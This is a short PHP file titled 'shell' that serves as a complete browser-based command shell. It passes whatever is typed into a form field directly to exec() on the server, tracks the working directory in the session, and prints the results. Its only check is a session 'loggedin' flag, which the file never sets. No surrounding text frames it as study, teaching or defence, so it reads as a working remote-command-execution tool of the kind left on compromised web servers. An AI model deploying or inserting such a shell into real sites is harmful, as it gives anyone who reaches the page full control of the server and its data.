<?php session_start();
$_SESSION["loggedin"] or die("error: you aren't authorized!\n"); ?>
<!doctype html>
<title>shell</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta charset="utf-8">
<form action="" method="post">
    <input name="input">
</form>
<?php
if (!isset($_SESSION["cwd"])) $_SESSION["cwd"] = getcwd();
if (!isset($_SESSION["screen"]))
    $_SESSION["screen"] = "";
function my_exec($command)
{
    $exec_output = null;
    chdir($_SESSION["cwd"]);
    exec($command . " ; pwd", $exec_output);
    $_SESSION["cwd"] = array_pop($exec_output); //getcwd();
    return implode("\n", $exec_output) . "\n";
}
$input = $_REQUEST["input"];
if ($input == "clear") $_SESSION["screen"] = "";
else if ($input)
    $_SESSION["screen"] =
        htmlspecialchars("input: [[ $input ]]" . " cwd: " . $_SESSION["cwd"] . "\n") .
        htmlspecialchars(my_exec($input)) . "<hr>" .
        $_SESSION["screen"];
echo "cwd: " . htmlspecialchars($_SESSION["cwd"]) . " <br>\n";
echo "<hr><pre>\n" . $_SESSION["screen"] . "</pre>\n";
?>